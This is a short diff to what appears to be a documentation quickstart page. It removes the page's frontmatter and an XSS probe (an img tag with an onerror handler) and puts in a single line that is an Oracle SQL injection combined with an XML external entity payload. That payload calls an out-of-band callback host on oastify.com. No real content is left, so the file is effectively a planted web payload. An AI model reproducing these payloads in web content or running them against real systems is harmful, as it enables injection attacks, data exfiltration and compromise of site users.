@@ -1,8 +1,1 @@
----
-title: 'Quickstart'
-description: 'Start building awesome documentation in under 5 minutes'
----
-
-## Setup your development
-
-<img src=x onerror=javascript:confirm(1);/></html>
+(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % uwxpq SYSTEM "http://3x1q2pfcfpyhmcz4m4n83nter5xzlqken2fp6dv.oasti'||'fy.com/">%uwxpq;]>'),'/l') from dual)
